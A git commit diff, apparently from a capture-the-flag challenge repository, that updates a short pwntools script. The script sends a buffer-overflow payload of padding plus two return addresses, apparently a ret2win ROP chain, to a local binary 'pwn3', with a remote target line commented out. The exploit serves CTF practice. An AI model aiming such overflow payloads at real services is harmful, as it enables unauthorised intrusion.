77dc41f8fd305bb717d8ec4fe2069b66cc898f1d
sophea <sopheazin77@gmail.com>
2026-01-23 13:33:44 +0700

    updated

--- assets/challenges/CNCC_1st/1.py
+++ assets/challenges/CNCC_1st/1.py
@@ -1,10 +1,11 @@
 from pwn import *
 
-p = process('./pwn2')
-#p = remote('3.1.32.51', 8010)
+p = process('./pwn3')
+# p= remote('3.1.32.51', 8001)
 
-payload = b'A'*76
-payload += p64(0x1337)
+payload = b'A'*0x38
+payload += p64(0x40101a)
+payload += p64(0x4011b6)
 
 p.sendline(payload)
 
